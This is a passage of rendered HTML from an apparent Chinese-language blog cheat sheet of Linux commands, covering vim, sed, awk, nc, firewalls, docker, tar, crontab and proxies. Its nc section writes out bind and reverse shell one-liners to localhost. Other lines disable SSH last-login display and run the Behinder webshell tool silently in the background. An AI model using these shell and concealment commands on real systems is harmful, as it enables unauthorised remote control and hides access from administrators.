class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># Linux所有行用vim进行后缀插入</span><br><span class=\"line\">:%s/$/Suffix</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20049.png\" alt><br>\n<img data-src=\"/N1h1l157/Linux/20050.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\"># linux vim删除多行内容:</span></span><br><span class=\"line\">将光标移动到需要删除的行，按一下ESC键，确保退出编辑模式</span><br><span class=\"line\">在dd命令前面加上要删除的行数,如要删除第<span class=\"number\">4</span>行以下的<span class=\"number\">3</span>行，按下<span class=\"number\">3</span> dd</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20051.png\" alt></p>\n<h2 id=\"sed\"><a class=\"markdownIt-Anchor\" href=\"#sed\">#</a> sed</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">添加行</span></span><br><span class=\"line\">sed -i &#x27;5i\\ new line&#x27; deafult.txt</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20052.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 删除行</span><br><span class=\"line\">sed -i <span class=\"string\">&#x27;5,7d&#x27;</span> deafult.txt</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20053.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 查看行</span><br><span class=\"line\">sed -n <span class=\"string\">&#x27;4,8p&#x27;</span> deafult.txt</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20054.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 首行尾行都添加单引号</span><br><span class=\"line\">sed <span class=\"string\">&#x27;s/^/&quot;/;s/$/&quot;/&#x27;</span> deafult.txt</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20055.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 关闭最后登陆的日志</span><br><span class=\"line\">sed -i <span class=\"string\">&#x27;s/#PrintLastLog yes/PrintLastLog no/g&#x27;</span> /etc/ssh/sshd_config;systemctl restart sshd</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20056.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 开启最后登陆的日志</span><br><span class=\"line\">sed -i <span class=\"string\">&#x27;s/PrintLastLog no/#PrintLastLog yes/g&#x27;</span> /etc/ssh/sshd_config;systemctl restart sshd</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20057.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 开启网络传输日志</span><br><span class=\"line\">sed -i <span class=\"string\">&#x27;s/#Banner none/Banner \\/etc\\/issue.net/g&#x27;</span> /etc/ssh/sshd_config;systemctl restart sshd;echo -e <span class=\"string\">&quot;hellow\\nworld&quot;</span> &gt; /etc/issue.net</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20058.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 关闭网络传输日志</span><br><span class=\"line\">sed -i <span class=\"string\">&#x27;s/Banner \\/etc\\/issue.net/#Banner none/g&#x27;</span> /etc/ssh/sshd_config;systemctl restart sshd;echo &gt; /etc/issue.net</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20059.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">关闭 logo 显示</span></span><br><span class=\"line\">修改 ~/.bashrc, 注释掉 neofetch</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20060.png\" alt></p>\n<h2 id=\"awk\"><a class=\"markdownIt-Anchor\" href=\"#awk\">#</a> awk</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">awk打印具体列数</span></span><br><span class=\"line\">netstat -tunlp | grep 10086 | awk &#x27;&#123;print $7&#125;&#x27; | cut -d &#x27;/&#x27; -f 1</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20062.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#删除第一列</span><br><span class=\"line\">ll | awk <span class=\"string\">&#x27;&#123;$1=&quot;&quot;;print $0&#125;&#x27;</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20064.png\" alt></p>\n<h2 id=\"history\"><a class=\"markdownIt-Anchor\" href=\"#history\">#</a> history</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">过滤出10条最常用的命令</span></span><br><span class=\"line\">history | awk &#x27;&#123;CMD[$2]++;count++;&#125; END &#123; for (a in CMD )print CMD[ a ]&quot; &quot; CMD[ a ]/count*100 &quot;% &quot; a &#125;&#x27; | grep -v &quot;./&quot; | column -c3 -s &quot; &quot; -t |sort -nr | nl | head -n10</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20065.png\" alt></p>\n<h2 id=\"nc\"><a class=\"markdownIt-Anchor\" href=\"#nc\">#</a> nc</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">nc测试本地端口是否开放</span></span><br><span class=\"line\">nc -zv localhost 10086</span><br><span class=\"line\">telnet 127.0.0.1</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20066.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#nc通过终端聊天</span></span><br><span class=\"line\">nc -lvvp <span class=\"number\">4444</span></span><br><span class=\"line\">nc <span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span> <span class=\"number\">4444</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20067.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 正向反弹shell</span><br><span class=\"line\">被控端：nc -lvp <span class=\"number\">4444</span> -e /bin/bash</span><br><span class=\"line\">控制端：nc <span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span> <span class=\"number\">4444</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20068.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 反向反弹shell：</span><br><span class=\"line\">控制端：nc -lvp <span class=\"number\">4444</span></span><br><span class=\"line\">被控端：nc <span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span> <span class=\"number\">4444</span> -e /bin/bash</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20069.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 反弹shell，在被控端输入信息，将被控端的信息全部导出到回显端</span><br><span class=\"line\">被控端：/bin/sh -i <span class=\"number\">2</span>&gt;&amp;<span class=\"number\">1</span> | nc <span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span> <span class=\"number\">4444</span></span><br><span class=\"line\">回显端：nc -lvp <span class=\"number\">4444</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20070.png\" alt><br>\n<img data-src=\"/N1h1l157/Linux/20071.png\" alt></p>\n<h2 id=\"firewalld\"><a class=\"markdownIt-Anchor\" href=\"#firewalld\">#</a> firewalld</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">安装</span></span><br><span class=\"line\">yum install firewalld</span><br><span class=\"line\">systemctl status firewalld </span><br><span class=\"line\">systemctl restart firewalld</span><br><span class=\"line\">systemctl stop firewalld</span><br><span class=\"line\">systemctl disable firewalld</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20072.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 开启端口</span><br><span class=\"line\">firewall-cmd --zone=public --<span class=\"built_in\">list</span>-ports</span><br><span class=\"line\">firewall-cmd --zone=public --add-port=<span class=\"number\">10086</span>/tcp --permanent</span><br><span class=\"line\">firewall-cmd --reload</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20073.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 关闭端口</span><br><span class=\"line\">firewall-cmd --zone=public --<span class=\"built_in\">list</span>-ports</span><br><span class=\"line\">firewall-cmd --zone=public --remove-port=<span class=\"number\">10086</span>/tcp --permanent</span><br><span class=\"line\">firewall-cmd --reload</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20074.png\" alt></p>\n<h2 id=\"nohup\"><a class=\"markdownIt-Anchor\" href=\"#nohup\">#</a> nohup</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">有日志的后台输出</span></span><br><span class=\"line\">nohup java -jar Behinder.jar &amp;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20076.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 无日志的后台输出</span><br><span class=\"line\">nohup java -jar Behinder.jar &gt;/dev/null <span class=\"number\">2</span>&gt;&amp;<span class=\"number\">1</span> &amp;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20075.png\" alt></p>\n<h2 id=\"docker\"><a class=\"markdownIt-Anchor\" href=\"#docker\">#</a> docker</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">查询所有的容器，过滤出Exited状态的容器，列出容器ID，删除这些容器</span></span><br><span class=\"line\">docker rm `docker ps -a|grep Exited|awk &#x27;&#123;print $1&#125;&#x27;`</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20077.png\" alt></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#删掉所有的docker镜像</span><br><span class=\"line\">docker rmi $(docker images -q)</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20078.png\" alt><br>\n<img data-src=\"/N1h1l157/Linux/20079.png\" alt></p>\n<h2 id=\"rpm\"><a class=\"markdownIt-Anchor\" href=\"#rpm\">#</a> rpm</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">安装一个包</span></span><br><span class=\"line\">rpm -ivh</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 升级一个包</span><br><span class=\"line\">rpm -Uvh</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 卸载一个包</span><br><span class=\"line\">rpm -e</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#查询当前安装的所有rpm包</span><br><span class=\"line\">rpm -qa </span><br><span class=\"line\">rpm -qa | grep -i chrome</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#查询httpd安装路径</span><br><span class=\"line\">rpm -ql 包全名 </span><br></pre></td></tr></table></figure>\n<h2 id=\"tar\"><a class=\"markdownIt-Anchor\" href=\"#tar\">#</a> tar</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">压缩、解压gz文件</span></span><br><span class=\"line\">tar -zcvf filename.tar.gz filename</span><br><span class=\"line\">tar -zxvf filarename.tar.gz</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20080.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 压缩当前目录下全部内容、解压zip文件</span><br><span class=\"line\">zip -r filename.zip .<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">unzip filename.zip</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20081.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 指定解压路径</span><br><span class=\"line\">tar -zxvf ../<span class=\"number\">1.</span>tar.gz -C ../</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20082.png\" alt></p>\n<h2 id=\"iconv\"><a class=\"markdownIt-Anchor\" href=\"#iconv\">#</a> iconv</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">获取归属地并编码为utf-8</span></span><br><span class=\"line\">curl http://whois.pconline.com.cn/ip.jsp -s | iconv -f gbk -t utf8 &gt; /tmp/x ; vim /tmp/x +&quot;d1&quot; +&quot;d1&quot; +&quot;wq&quot;;cat /tmp/x</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20083.png\" alt></p>\n<h2 id=\"tail\"><a class=\"markdownIt-Anchor\" href=\"#tail\">#</a> tail</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">排除第一行的日志</span></span><br><span class=\"line\">cat deafult.txt | tail -n +2</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20084.png\" alt></p>\n<h2 id=\"lrzsz\"><a class=\"markdownIt-Anchor\" href=\"#lrzsz\">#</a> lrzsz</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">比如xshell或者SecureCRT才可以使用,需要修改默认路径</span></span><br><span class=\"line\">yum install -y lrzsz.x86_64</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">sz：将选定的文件发送（send）到本地机器</span></span><br><span class=\"line\">sz 1.tar.gz</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20086.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\"># rz：运行该命令会弹出一个文件选择窗口，从本地选择文件上传到服务器(receive)</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20085.png\" alt></p>\n<h2 id=\"eof\"><a class=\"markdownIt-Anchor\" href=\"#eof\">#</a> EOF</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">EOF 基本使用</span></span><br><span class=\"line\">cat &gt; .. &lt;&lt; EOF</span><br><span class=\"line\">xxx</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20087.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">直接在宿主机上执行命令</span></span><br><span class=\"line\">ssh -T root@10.255.200.72 &#x27;id&#x27;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">不产生交互式shell, 直接执行命令</span></span><br><span class=\"line\">ssh -T root@10.255.200.72 &lt;&lt; &#x27;EOF&#x27;</span><br><span class=\"line\">whoami</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20088.png\" alt></p>\n<h2 id=\"iptables\"><a class=\"markdownIt-Anchor\" href=\"#iptables\">#</a> iptables</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看是否安装</span></span><br><span class=\"line\">iptables -V</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">安装</span></span><br><span class=\"line\">yum install iptables-services</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 查看防火墙的状态 </span><br><span class=\"line\">systemctl status iptables.service </span><br><span class=\"line\">systemctl stop iptables.service </span><br><span class=\"line\">systemctl start iptables.service </span><br><span class=\"line\">systemctl restart iptables.service</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20089.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 查询防火墙开放端口</span><br><span class=\"line\">iptables -L -n</span><br><span class=\"line\">iptables --<span class=\"built_in\">list</span>-rules</span><br><span class=\"line\">iptables -L -n --line-number</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20090.png\" alt><br>\n<img data-src=\"/N1h1l157/Linux/20091.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 允许所有服务器访问指定端口</span><br><span class=\"line\">iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport <span class=\"number\">22</span> -j ACCEPT</span><br><span class=\"line\">iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport <span class=\"number\">80</span> -j ACCEPT</span><br><span class=\"line\"></span><br><span class=\"line\"># 保存iptables规则</span><br><span class=\"line\">service iptables save</span><br><span class=\"line\"></span><br><span class=\"line\"># 查看iptables的配置文件</span><br><span class=\"line\">cat /etc/sysconfig/iptables</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20092.png\" alt></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 将新增的规则放在iptables规则页的首处</span><br><span class=\"line\">iptables -I INPUT -p tcp --dport <span class=\"number\">111</span> -j ACCEPT</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20093.png\" alt></p>\n<h2 id=\"crontab\"><a class=\"markdownIt-Anchor\" href=\"#crontab\">#</a> crontab</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">编辑定时任务</span></span><br><span class=\"line\">crontab -e</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看定时任务</span></span><br><span class=\"line\">crontab -l</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">“*”表示“任意值”，分别为 分、时、天、月、周</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">表示任务将在每个星期日的凌晨2点40分执行</span></span><br><span class=\"line\">“40 2 * * 0”</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">每两天运行一次的任务，<span class=\"string\">&quot;*/2&quot;</span>表示每隔两天</span></span><br><span class=\"line\">&quot;* * */2 * *&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">任务将在每天凌晨3点执行</span></span><br><span class=\"line\">&quot;0 3 * * *&quot;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20094.png\" alt></p>\n<h2 id=\"ufw\"><a class=\"markdownIt-Anchor\" href=\"#ufw\">#</a> ufw</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">安装防火墙</span></span><br><span class=\"line\">yum install ufw</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 开启关闭</span><br><span class=\"line\">ufw enable</span><br><span class=\"line\">ufw status</span><br><span class=\"line\">ufw status verbose</span><br><span class=\"line\">ufw disable</span><br><span class=\"line\">ufw allow 10086</span><br><span class=\"line\">ufw delete allow 10086</span><br></pre></td></tr></table></figure>\n<h2 id=\"proxychians4\"><a class=\"markdownIt-Anchor\" href=\"#proxychians4\">#</a> proxychians4</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看使用的代理</span></span><br><span class=\"line\">cat /opt/homebrew/etc/proxychains.conf | tail -n 2 | grep -v &quot;#&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">要使用brew的curl才可以</span></span><br><span class=\"line\">proxychains4 /opt/homebrew/Cellar/curl/8.0.1/bin/curl 127.0.0.1:8080</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20095.png\" alt></p>\n<h2 id=\"export\"><a class=\"markdownIt-Anchor\" href=\"#export\">#</a> export</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">设置代理</span></span><br><span class=\"line\">export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7890</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">取消代理</span></span><br><span class=\"line\">unset http_proxy &amp; unset https_proxy</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20096.png\" alt></p>\n<h2 id=\"ˆliˆil\"><a class=\"markdownIt-Anchor\" href=\"#ˆliˆil\">#</a> ˆliˆil</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">ˆoldˆnew。假如我在查看 file1 后 接着想查看 file4，那么只要执行 ˆ1ˆ4：</span></span><br><span class=\"line\">cat file1 </span><br><span class=\"line\">ˆ1ˆ4 </span><br><span class=\"line\">cat 